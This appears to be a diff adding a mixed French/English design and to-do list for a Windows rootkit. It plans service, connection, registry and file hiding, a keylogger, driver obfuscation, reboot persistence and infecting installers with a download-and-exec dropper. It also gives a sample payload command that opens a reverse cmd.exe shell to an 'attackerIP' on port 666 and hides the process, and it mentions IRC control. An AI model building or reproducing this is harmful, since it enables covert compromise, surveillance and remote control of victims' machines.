@@ -1,0 +1,41 @@
+Hide Service(himself)
+Immortal process					-> http://www.ivanlef0u.tuxfamily.org/?p=136
+Hide TCP UDP connections
+Hide Registry key
+Survive reboot						-> presque bon
+Keylogger
+Driver Obfucation
+Client Obfuscation
+Payload system (ini file with sequence of preconfigured commands)
+Portability within windows versions	-> All nt systems is preferable
+Driver packer/unpacker				-> je vais le stocker au cul du client.exe 
+									et il y aura une petite routine asm qui 
+									commencera par unpacker le driver et son payload
+									(si ca a pas deja ete fait).
+									Ainsi le client.exe sera tout en un et pourra
+									aisement etre utilise dans une strategie Download and Exec
+
+Todo options:
+--tcpshell <IP> <PORT>				-> Creer une connection TCP, ouvrir un cmd.exe avec ses i/o rediriges sur le socket
+--hport <PORT> <PROTOCOLE/all>		-> masquer une connection TCP et/ou UDP
+--hs <me/SERVICE>					-> masquer un service par son nom
+--hk <me/KEY>						-> masquer une cle de registre
+--hf <me/FILENAME>					-> hider le dossier contenant le driver
+--hp <me/PID/NAME>
+--im <me/PID/NAME>					-> rendre immortel un processus
+--log <err/warn/all> <LOGFILE>		-> log
+
+Infecter (packer - jambiKeepSize) un installeur avec un download and exec
+qui va chercher le pack (client + driver + payload)
+une fois l'installeur execute en root, 
+le pack est telecharge et execute.
+Le driver et le payload s'auto-unpack.
+Le client charge et execute le payload.
+
+Payload exemple:
+--start --log all soundmgr.log --im me --tcpshell attackerIP 666 --im cmd.exe --hport 666 tcp --hs me --hf me --reboot on --hk me
+
+Un serveur ecoute sur le port voulu et attend pour une 
+connection TCP.
+
+Connection sur seveur IRC serai le must :)
